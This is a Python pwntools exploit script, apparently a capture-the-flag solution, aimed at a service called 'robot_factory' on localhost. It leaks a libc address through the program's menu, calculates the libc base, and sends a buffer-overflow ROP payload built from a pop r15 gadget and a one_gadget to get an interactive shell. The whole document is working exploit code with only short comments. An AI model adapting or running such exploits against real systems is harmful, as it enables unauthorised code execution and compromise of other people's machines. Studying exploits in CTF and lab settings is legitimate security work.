import time
from pwn import *

context.log_level = "error"

elf = ELF("./robot_factory")

io = remote("localhost", 5000)
io.recv()


# leak address and use it to calculate libc base
io.sendline(b"n")
io.sendline(b"s")
io.sendline(b"1")
io.sendline(b"1")

io.recvuntil(b"Result: ")
res = io.recv().split(b"\n")[0]
leak = int(res.decode())
libc_base = leak + (0x7f1b57073000 - 0x7f1b5684aec8)
print("[+] libc base:", hex(libc_base))


# use one gadget to construct payload to pop shell
one_gadget = p64(libc_base + 0xe6c7e)
pop_r15 = p64(0x401ad2)

payload = b"A" * 24
payload += pop_r15
payload += p64(0)
payload += one_gadget
payload += b"A" * (0x80 - len(payload))


# send payload to pop shell
io.sendline(b"s")
io.sendline(b"m")
io.sendline(payload)
io.sendline(b"18")

io.clean()
io.interactive()
